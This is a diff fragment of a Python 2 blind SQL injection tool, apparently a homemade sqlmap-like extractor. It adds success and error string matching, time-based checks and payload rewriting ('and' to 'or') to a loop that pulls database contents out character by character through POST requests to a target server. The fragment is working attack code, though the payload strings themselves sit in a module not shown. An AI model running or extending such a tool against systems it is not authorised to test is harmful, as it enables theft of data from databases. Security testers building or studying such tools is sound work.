+						cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
+					if len(self.error) > 0:
+						# Compare if Error string not appear inside Baseline Response
+						cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
 				else:
-					cumple = Attempt.content == self.GoodRequest.content				
+					if (len(self.success) == 0 ) and (len(self.error) == 0):
+						cumple = Attempt.content == self.GoodRequest.content
+					if len(self.success) > 0:
+						cumple = self.success in Attempt.content
+					if len(self.error) > 0:
+						cumple = self.error not in Attempt.content
+
 				if found:
 					if chr(medio) != "," and not self.verbosity:
 						self.showCharacter(chr(medio))
@@ -911,7 +1114,7 @@ class Injection:
 		letras = ""
 		for l in xrange(1,longitud+1):
 #			print pppp.format(offset,100)
-			liminf = 31
+			liminf = 28
 			limsup = 127
 			medio = (limsup + liminf)//2
 			found = False
@@ -919,15 +1122,37 @@ class Injection:
 			#sleep(2)
 			while True:
 				self.dataTempo = self.datos.copy()
-				query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,pppp,self.newSuffix),offset=offse,pos=l,cAscii=medio,records=True)
+				payl = pppp
+				if len(self.error) > 0:
+					payl = payl.replace("and","or",1)
+					payl = payl.replace("&&","||",1)
+				query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,payl.replace(self.dormir,str(self.Time)),self.newSuffix),offset=offse,pos=l,cAscii=medio,records=True)
 				#print query
 				#print "Offset: {0} Position:{1}".format(offse,l)
 				Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
+
+				if self.verbosity:
+						self.showData(objeto=Attempt,Previo=False,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
+					# Imprimir Respuesta
 				if self.Based == "time":
-					cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
-					#print "tOriginal: {0}\nqTime: {1}".format(self.GoodRequest.elapsed.total_seconds(),Attempt.elapsed.total_seconds())
+					#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
+					if (len(self.success) == 0 ) and (len(self.error) == 0):
+						# Compare Baseline response against Attempt response
+						cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time)))
+					if len(self.success) > 0:
+						# Compare if Success string is contained inside Baseline Response 
+						cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
+					if len(self.error) > 0:
+						# Compare if Error string not appear inside Baseline Response
+						cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.Time))
 				else:
-					cumple = Attempt.content == self.GoodRequest.content
+					if (len(self.success) == 0 ) and (len(self.error) == 0):
+						cumple = Attempt.content == self.GoodRequest.content
+					if len(self.success) > 0:
+						cumple = self.success in Attempt.content
+					if len(self.error) > 0:
+						cumple = self.error not in Attempt.content
+
 				if found:
 #					if chr(medio) != "," and not self.verbosity:
 #					if chr(medio) != ",":
@@ -953,8 +1178,7 @@ class Injection:
 		return letras
 
 	def Begin(self):
-		print "(>¬.¬)>\n"+"="*20
-		print self.Based
+		#print self.Based
 		if self.Based == "time":
 			self.PayloadsAttempt = timebased.PayloadsAttempt
 			self.PayloadsDBnames = timebased.PayloadsDBnames
@@ -983,8 +1207,7 @@ class Injection:
 		#sleep(1)
 		if self.method:#GET
 			pass
-		#POST Method
-		else:
+		else: #POST Method
 			if not self.YaExiste: # If not exists files with records of previous scan
 				#POST Requests
 				self.PostInjection()
@@ -1028,10 +1251,14 @@ class Injection:
 				exit(1)
 
 	def CreateFiles(self):
-		self.hname = self.server.split("/")[2]
-		self.aData = self.server.split("/")[3]
-		self.fullPath = self.reportDir+""+self.hname+"/"+self.aData
-		print self.fullPath
+		try:
+			self.hname = self.server.split("/")[2]
+			self.aData = self.server.split("/")[3]
+			self.fullPath = self.reportDir+""+self.hname+"/"+self.aData
+			print self.fullPath
+		except:
+			print """{0} -h for help""".format(argv[0])
+			exit(1)
 		#########################################################################
 		##  First, we check if exists files previously generated by the tools  ##
 		#########################################################################
@@ -1060,22 +1287,22 @@ class Injection:
 
 def Opciones(argv):
 	try:
-		opciones, argumentos = getopt(argv[1:],"ho:v",["v","request=","anduin=","cookies=","user-agent=","method=","random-agent","data=","proxy=","columns=","tables=","server=",'dbname=','db','based=',"time=","error="])
+		opciones, argumentos = getopt(argv[1:],"ho:v",["help","v","request=","success=","cookies=","user-agent=","method=","random-agent","data=","proxy=","columns=","tables=","server=",'dbname=','db','based=',"time=","error="])
 	except GetoptError:
-		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
+		print """{0} -h for help""".format(argv[0])
 		exit(2)
 	for opt, vals in opciones:
 		#Ayuda
 		if opt in ('-h','--help'):
-			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
+			#print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
+			print inject.Ayuda
+			exit(1)
 		#Server
 		elif opt in ('--request'):
 			print vals
 			#print "{0} -> {1}".format(opt,vals)
 			inject.setServer(vals)
 		#User-Agent
-		elif opt in ('--anduin'):
-			print ">>",vals
 		elif opt in ('--user-agent'):
 			inject.setAgent(vals)
 			#print "{0} -> {1}".format(opt,vals)
@@ -1130,6 +1357,8 @@ def Opciones(argv):
 		elif opt == '--time':
 			inject.setTime(vals)
 		#Option not valid
+		elif opt == '--success':
+			inject.setSuccess(vals)
 		elif opt == '--error':
 			inject.setError(vals)
 		elif opt == '--method':
@@ -1139,7 +1368,7 @@ def Opciones(argv):
 				print "Method not implemented"
 				exit(1)
 		else:
-			print '<{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
+			print '<{0} -h for help'.format(argv[0])
 			exit(1)
 	else:
 		main()
@@ -1152,6 +1381,7 @@ def main():
 	inject.Begin()
 
 if __name__ == "__main__":
+	print "\t"*2,"%"*25,"\n","\t"*2,"%%"*2," Becarios Team ","%%"*2,"\n","\t"*2,"%"*25
 	if isdir(getenv("HOME")+"/sql/"):
 		pass
 	else:
